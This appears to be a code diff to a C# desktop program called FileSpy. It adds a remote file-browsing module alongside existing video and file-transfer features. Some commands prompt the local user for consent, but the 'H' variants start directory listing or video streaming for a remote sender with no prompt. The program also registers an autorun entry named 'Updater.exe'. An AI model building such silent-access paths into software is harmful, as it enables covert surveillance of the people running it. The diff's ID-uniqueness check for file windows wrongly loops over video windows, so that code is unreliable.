@@ -4,6 +4,7 @@ using FileSpy.Windows;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -19,11 +20,13 @@ namespace FileSpy
     /// </summary>
     public partial class MainWindow : Window
     {
-        List<UserControll> Users;
-        List<SetupWindow> Setupers;
-        List<GettingWindow> Getters;
-        List<VideoWindow> VideoWindows;
-        List<VideoClass> VideoClasses;
+        List<UserControll> Users = new List<UserControll>();
+        List<SetupWindow> Setupers = new List<SetupWindow>();
+        List<GettingWindow> Getters = new List<GettingWindow>();
+        List<VideoWindow> VideoWindows = new List<VideoWindow>();
+        List<VideoClass> VideoClasses = new List<VideoClass>();
+        List<FileWindow> FileWindows = new List<FileWindow>();
+        List<FileClass> FileClasses = new List<FileClass>();
 
         ConnectionClass Connection;
 
@@ -106,11 +109,6 @@ namespace FileSpy
                 if (IsStartupItem())
                     SetAutorunValue(false, Environment.CurrentDirectory + "\\Updater.exe");
             }
-            Users = new List<UserControll>();
-            Setupers = new List<SetupWindow>();
-            Getters = new List<GettingWindow>();
-            VideoWindows = new List<VideoWindow>();
-            VideoClasses = new List<VideoClass>();
 
             if (Environment.GetCommandLineArgs().Length == 1)
                 Close();
@@ -428,7 +426,11 @@ namespace FileSpy
                     string[] com = message.GetStringPackage().Split(';');
                     getter.FileName = com[0];
                     getter.FileSize = Convert.ToInt64(com[1]);
-                    getter.CloseEvent += Getter_CloseEvent;
+                    getter.CloseEvent += (GettingWindow window) =>
+                    {
+                        Getters.Remove(window);
+                        GC.Collect();
+                    };
                     getter.Owner = this;
                     getter.Show();
                     Getters.Add(getter);
@@ -463,7 +465,7 @@ namespace FileSpy
 
             #endregion
 
-            #region VideoCommands
+            #region VideoMCommands
             if (message.Command == Commands.RVideoModule)
             {
                 Task.Run(() =>
@@ -495,7 +497,11 @@ namespace FileSpy
                         if (window.Result)
                         {
                             var video = new VideoClass(message.ElementID, message.Sender, Connection);
-                            video.CloseEvent += VideoSender_CloseEvent;
+                            video.CloseEvent += (VideoClass obj) =>
+                            {
+                                VideoClasses.Remove(obj);
+                                GC.Collect();
+                            };
                             video.Start();
                             VideoClasses.Add(video);
                         }
@@ -508,7 +514,11 @@ namespace FileSpy
             if (message.Command == Commands.HVideoModule)
             {
                 var video = new VideoClass(message.ElementID, message.Sender, Connection);
-                video.CloseEvent += VideoSender_CloseEvent;
+                video.CloseEvent += (VideoClass obj) =>
+                {
+                    VideoClasses.Remove(obj);
+                    GC.Collect();
+                };
                 video.Start();
                 VideoClasses.Add(video);
             }
@@ -628,6 +638,94 @@ namespace FileSpy
                 catch { }
             }
             #endregion
+
+            #region FileMCommands
+            if (message.Command == Commands.RFileModule)
+            {
+                Task.Run(() =>
+                {
+                    Dispatcher.Invoke(() =>
+                    {
+                        string name = "[Secret]";
+                        for (int i = 0; i < Users.Count; i++)
+                        {
+                            if (message.Sender == Users[i].ID)
+                                name = Users[i].NameLabel.Content as string;
+                        }
+                        var window = new RequestWindow(name, "<TextFile>");
+                        window.Owner = this;
+                        if (!SilenceControll.Mode)
+                        {
+                            window.Topmost = false;
+                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
+                            if (!IsActive)
+                            {
+                                this.Show();
+                                if (Icons != null)
+                                    Icons.Visible = false;
+                                this.WindowState = WindowState.Minimized;
+                            }
+                        }
+                        Helper.FlashApplicationWindow();
+                        window.ShowDialog();
+                        if (window.Result)
+                        {
+                            var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
+                            fileClass.CloseEvent += (FileClass obj) =>
+                            {
+                                FileClasses.Remove(obj);
+                            };
+                            fileClass.Start();
+                            FileClasses.Add(fileClass);
+                        }
+                        else
+                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.FileDenied, message.ElementID));
+                    });
+                });
+            }
+
+            if (message.Command == Commands.HFileModule)
+            {
+                var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
+                fileClass.CloseEvent += (FileClass obj) =>
+                {
+                    FileClasses.Remove(obj);
+                };
+                fileClass.Start();
+                FileClasses.Add(fileClass);
+            }
+
+            if (message.Command == Commands.FilePulsar)
+            {
+                try
+                {
+                    FindFileClass(message.ElementID, message.Sender).Pulsar();
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.CD)
+            {
+                try
+                {
+                    byte[] data = FindFileClass(message.ElementID, message.Sender).CD(message.GetStringPackage());
+                    Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Dirs, message.ElementID, data));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.Dirs)
+            {
+                Dispatcher.Invoke(() =>
+                {
+                    try
+                    {
+                        FindFileWindow(message.ElementID).SetDirs(message.Package);
+                    }
+                    catch { }
+                });
+            }
+            #endregion
         }
 
         private void User_ActiveEvent(int id, string name, int command)
@@ -656,7 +754,11 @@ namespace FileSpy
                 var setup = new SetupWindow(gid, id, name, Connection);
                 Setupers.Add(setup);
                 setup.Owner = this;
-                setup.CloseEvent += Setup_CloseEvent;
+                setup.CloseEvent += (SetupWindow window) =>
+                {
+                    Setupers.Remove(window);
+                    GC.Collect();
+                };
                 setup.Show();
             }
 
@@ -678,13 +780,37 @@ namespace FileSpy
 
                 var video = new VideoWindow(gid, id, name, Connection);
                 VideoWindows.Add(video);
-                video.CloseEvent += Video_CloseEvent;
+                video.CloseEvent += (VideoWindow window) => 
+                {
+                    VideoWindows.Remove(window);
+                    GC.Collect();
+                };
                 video.Show();
             }
 
             if (command == ElementCommands.FileModule)
             {
-                var fileWindow = new FileWindow();
+                Random r = new Random();
+                int gid = -1;
+                bool ok = true;
+                while (ok)
+                {
+                    ok = false;
+                    gid = r.Next(1, Int32.MaxValue / 2);
+                    for (int i = 0; i < VideoWindows.Count; i++)
+                    {
+                        if (gid == VideoWindows[i].ID)
+                            ok = true;
+                    }
+                }
+
+                var fileWindow = new FileWindow(gid, id, name, Connection);
+                FileWindows.Add(fileWindow);
+                fileWindow.CloseEvent += (FileWindow window) =>
+                {
+                    FileWindows.Remove(window);
+                    GC.Collect();
+                };
                 fileWindow.Show();
             }
         }
@@ -733,28 +859,26 @@ namespace FileSpy
             return null;
         }
 
-        private void Setup_CloseEvent(SetupWindow window)
+        private FileWindow FindFileWindow(int id)
         {
-            Setupers.Remove(window);
-            GC.Collect();
+            for (int i = 0; i < FileWindows.Count; i++)
+            {
+                if (FileWindows[i].ID == id)
+                    return FileWindows[i];
+            }
+
+            return null;
         }
 
-        private void Getter_CloseEvent(GettingWindow window)
+        private FileClass FindFileClass(int id, int userID)
         {
-            Getters.Remove(window);
-            GC.Collect();
-        }
+            for (int i = 0; i < FileClasses.Count; i++)
+            {
+                if (FileClasses[i].ID == id && FileClasses[i].UserID == userID)
+                    return FileClasses[i];
+            }
 
-        private void Video_CloseEvent(VideoWindow window)
-        {
-            VideoWindows.Remove(window);
-            GC.Collect();
-        }
-
-        private void VideoSender_CloseEvent(VideoClass videoClass)
-        {
-            VideoClasses.Remove(videoClass);
-            GC.Collect();
+            return null;
         }
     }
 }
